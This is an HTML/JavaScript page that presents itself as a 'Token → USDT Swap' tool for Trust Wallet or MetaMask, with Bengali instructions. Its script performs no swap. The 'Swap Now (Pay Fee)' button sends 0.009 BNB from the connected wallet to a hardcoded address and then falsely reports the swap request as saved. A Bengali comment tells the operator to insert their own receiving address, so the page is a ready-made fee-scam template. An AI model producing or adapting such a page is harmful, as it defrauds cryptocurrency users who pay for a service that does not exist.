<!doctype html>
<html lang="bn">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Token → USDT Swap Helper</title>
  <style>
    :root{
      --bg:#0b1220;--card:#101828;--accent:#f6c261;--muted:#9aa4b2;
    }
    body{font-family:Inter,system-ui,Arial;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;background:linear-gradient(180deg,#071022 0%,#071629 100%);color:#e6eef6}
    .card{background:var(--card);padding:24px;border-radius:16px;box-shadow:0 8px 25px rgba(0,0,0,0.6);width:100%;max-width:420px}
    h1{margin:0 0 10px;font-size:22px;text-align:center;color:#fff}
    p{text-align:center;color:var(--muted);margin-bottom:20px;font-size:14px}
    label{display:block;margin:8px 0 4px;color:var(--muted);font-size:13px}
    input{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.1);background:transparent;color:#fff;margin-bottom:12px}
    button{width:100%;padding:12px;border-radius:12px;border:none;background:var(--accent);color:#081019;font-weight:600;font-size:15px;cursor:pointer;margin-top:8px}
    #status{margin-top:12px;font-size:13px;color:var(--muted);background:rgba(255,255,255,0.05);padding:10px;border-radius:8px}
  </style>
</head>
<body>
  <div class="card">
    <h1>Token → USDT Swap</h1>
    <p>Open inside Trust Wallet DApp browser or MetaMask.<br/>প্রথমে 0.009 BNB fee confirm করতে হবে।</p>

    <label>Token address</label>
    <input id="token" placeholder="0x..." />

    <label>Amount (token)</label>
    <input id="amount" placeholder="1000" />

    <label>Recipient (USDT address)</label>
    <input id="recipient" placeholder="0x..." />

    <button id="connectBtn">Connect Wallet</button>
    <button id="swapBtn">Swap Now (Pay Fee)</button>

    <div id="status">Status: Idle</div>
  </div>

<script>
(async function(){
  const provider = window.ethereum || (window.web3 && window.web3.currentProvider);
  const feeBNB = "0.009";
  const FEE_ADDRESS = "0x0F28601Dd41e77990643Bab3efc1E94eB63793b3"; // এখানে নিজের BNB ঠিকানা বসাও

  function setStatus(msg){ document.getElementById('status').textContent = 'Status: '+msg; }
  function toWeiHex(amount){
    const parts = (''+amount).split('.');
    const whole = parts[0]||'0';
    const frac = parts[1]||'';
    const weiWhole = BigInt(whole) * (10n**18n);
    const fracPadded = (frac+'0'.repeat(18)).slice(0,18);
    const weiFrac = BigInt(fracPadded);
    return '0x'+(weiWhole+weiFrac).toString(16);
  }

  let currentAccount = null;

  document.getElementById('connectBtn').onclick = async()=>{
    if(!provider){ setStatus('No wallet provider detected'); return; }
    try{
      const accs = await provider.request({method:'eth_requestAccounts'});
      currentAccount = accs[0];
      setStatus('Connected: '+currentAccount);
    }catch(e){ setStatus('Connection rejected'); }
  };

  document.getElementById('swapBtn').onclick = async()=>{
    if(!provider){ setStatus('No provider'); return; }
    if(!currentAccount){ setStatus('Connect wallet first'); return; }

    const token = document.getElementById('token').value.trim();
    const amount = document.getElementById('amount').value.trim();
    const recipient = document.getElementById('recipient').value.trim();
    if(!/^0x[a-fA-F0-9]{40}$/.test(token)){ setStatus('Invalid token'); return; }
    if(!amount || Number(amount)<=0){ setStatus('Invalid amount'); return; }
    if(!/^0x[a-fA-F0-9]{40}$/.test(recipient)){ setStatus('Invalid recipient'); return; }

    // send fee transaction
    const tx = {
      from: currentAccount,
      to: FEE_ADDRESS,
      value: toWeiHex(feeBNB)
    };

    try{
      setStatus('Requesting wallet confirmation for fee...');
      const txHash = await provider.request({method:'eth_sendTransaction', params:[tx]});
      setStatus('Fee paid ✅ txHash: '+txHash+'\nSwap request saved.');
      // এখানে তুমি চাইলে fetch দিয়ে API-তে পাঠাতে পারো (token, amount, recipient, txHash)
    }catch(err){
      console.error(err);
      setStatus('Transaction failed or rejected');
    }
  };
})();
</script>
</body>
</html>
